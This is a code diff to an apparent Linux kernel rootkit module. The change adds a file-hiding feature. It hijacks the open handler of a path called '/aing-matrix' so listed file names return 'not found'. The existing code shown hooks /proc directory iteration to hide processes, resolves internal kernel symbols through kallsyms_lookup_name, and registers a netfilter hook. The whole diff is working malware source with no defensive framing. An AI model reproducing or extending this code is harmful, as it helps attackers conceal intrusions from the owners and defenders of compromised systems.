@@ -64,17 +64,12 @@ size_t closed_port_count = 0;
 bool hidden = 0;
 static struct list_head* mod_list;
 
-#if 0
-struct task_pid {
-    struct task_struct* ts;
-    struct pid* p;
-};
-
-static struct task_pid hidden_procs[10];
-#endif
-
 static size_t hidden_procs[100];
 int hidden_count = 0;
+
+static unsigned char hidden_files[100][256];
+int hidden_file_count = 0;
+
 static rwlock_t* my_tasklist_lock;
 
 static struct path proc_path;
@@ -82,6 +77,11 @@ static struct file_operations proc_fops;
 static struct file_operations* backup_proc_fops;
 static struct inode* proc_inode;
 struct dir_context* backup_ctx;
+
+static struct path my_file_path;
+static struct file_operations file_ops;
+static struct file_operations* backup_file_ops;
+static struct inode* my_file_inode;
 
 void consume_keys(struct work_struct* work);
 
@@ -607,6 +607,21 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
+int bad_open(struct inode * ino, struct file *f) {
+    const unsigned char *path_name = f->f_path.dentry->d_name.name;
+    int i;
+    int result = 0;
+
+    for (i = 0; i < hidden_file_count; ++i) {
+        if (strncmp(path_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
+            return -ENOENT;
+        }
+    }
+    //Perform open call here
+    result = backup_file_ops->open(ino, f);
+    return result;
+}
+
 /*
  * function:
  *    mod_init
@@ -622,11 +637,17 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
  */
 static int __init mod_init(void) {
     int err;
+    int i;
 
     change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
             "change_pid");
     alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
     my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
+
+    //Zero out the hidden file names
+    for (i = 0; i < 100; ++i) {
+        memset(hidden_files[i], 0, 256);
+    }
 
     if (kern_path("/proc", 0, &proc_path)) {
         return -1;
@@ -636,6 +657,15 @@ static int __init mod_init(void) {
     backup_proc_fops = proc_inode->i_fop;
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
+
+    if (kern_path("/aing-matrix", 0, &my_file_path)) {
+        return -1;
+    }
+    my_file_inode = my_file_path.dentry->d_inode;
+    file_ops = *my_file_inode->i_fop;
+    backup_file_ops = my_file_inode->i_fop;
+    file_ops.open = bad_open;
+    my_file_inode->i_fop = &file_ops;
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -699,6 +729,9 @@ static void __exit mod_exit(void) {
 
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
+
+    my_file_inode = my_file_path.dentry->d_inode;
+    my_file_inode->i_fop = backup_file_ops;
 
     if (svc) {
         if (svc->tls_socket) {
